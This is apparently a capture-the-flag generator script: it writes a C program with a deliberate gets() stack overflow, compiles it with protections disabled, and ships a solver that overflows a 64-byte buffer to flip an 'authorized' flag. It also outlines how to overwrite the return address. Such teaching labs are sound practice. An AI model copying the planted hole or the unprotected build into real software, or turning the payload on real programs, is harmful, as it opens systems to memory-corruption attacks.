#!/usr/bin/env python3
"""
Buffer Overflow Challenge - Basic stack overflow
Compile: gcc -o challenge challenge.c -fno-stack-protector -no-pie -z execstack
"""

import struct
import subprocess
import os

# C source code for the challenge
CHALLENGE_C = '''
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Hidden function that prints the flag
void win() {
    printf("flag{buffer_overflow_overwrites_variables}\\n");
}

// Vulnerable function
void vulnerable() {
    int authorized = 0;
    char buffer[64];
    
    printf("Enter your name: ");
    gets(buffer);  // VULNERABLE! No bounds checking
    
    printf("Hello, %s!\\n", buffer);
    
    if (authorized) {
        printf("Access granted!\\n");
        win();
    } else {
        printf("Access denied. authorized = %d\\n", authorized);
    }
}

int main() {
    printf("=== Buffer Overflow Challenge ===\\n");
    printf("Can you overflow the buffer to change 'authorized'?\\n\\n");
    vulnerable();
    return 0;
}
'''

def create_source():
    """Create the C source file"""
    with open('challenge.c', 'w') as f:
        f.write(CHALLENGE_C)
    print("Source file created: challenge.c")

def compile_challenge():
    """Compile with vulnerable settings"""
    try:
        # Compile with protections disabled
        subprocess.run([
            'gcc', '-o', 'challenge', 'challenge.c',
            '-fno-stack-protector',  # Disable stack canary
            '-no-pie',               # Disable ASLR for binary
            '-z', 'execstack',       # Executable stack
            '-m64'                   # 64-bit
        ], check=True)
        print("Compiled successfully: challenge")
        
        # Set permissions
        os.chmod('challenge', 0o755)
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e}")
    except FileNotFoundError:
        print("GCC not found. Install with: apt install gcc")

def solve():
    """Solution: overflow buffer to overwrite authorized variable"""
    
    # The buffer is 64 bytes, authorized is right after it
    # We need to write 64 bytes + 4 more bytes to overwrite authorized
    
    # Payload: 64 'A's + value to set authorized to non-zero
    payload = b'A' * 64 + struct.pack('<I', 1)
    
    # Send payload
    proc = subprocess.Popen(
        ['./challenge'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    stdout, stderr = proc.communicate(payload + b'\n')
    print(stdout.decode())
    if stderr:
        print("STDERR:", stderr.decode())

def solve_with_shellcode():
    """Alternative solution: redirect execution to win()"""
    
    # This is more advanced - find address of win() and overwrite return address
    # For simplicity, we'll use the authorized overwrite method
    
    # In a real scenario, you'd:
    # 1. Find win() address: objdump -d challenge | grep win
    # 2. Overflow buffer + saved RBP + return address
    
    print("Use the simpler solve() method first!")
    print("For advanced exploitation:")
    print("1. Find win() address: objdump -d challenge | grep win")
    print("2. Overflow: 64 (buffer) + 8 (saved RBP) + win() address")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        if sys.argv[1] == 'create':
            create_source()
        elif sys.argv[1] == 'compile':
            compile_challenge()
        elif sys.argv[1] == 'solve':
            solve()
        elif sys.argv[1] == 'solve2':
            solve_with_shellcode()
        else:
            print("Usage: python3 generate.py [create|compile|solve|solve2]")
    else:
        print("Buffer Overflow Challenge Generator")
        print("=" * 40)
        print("1. Create source: python3 generate.py create")
        print("2. Compile: python3 generate.py compile")
        print("3. Solve: python3 generate.py solve")
        print("4. Advanced solve: python3 generate.py solve2")
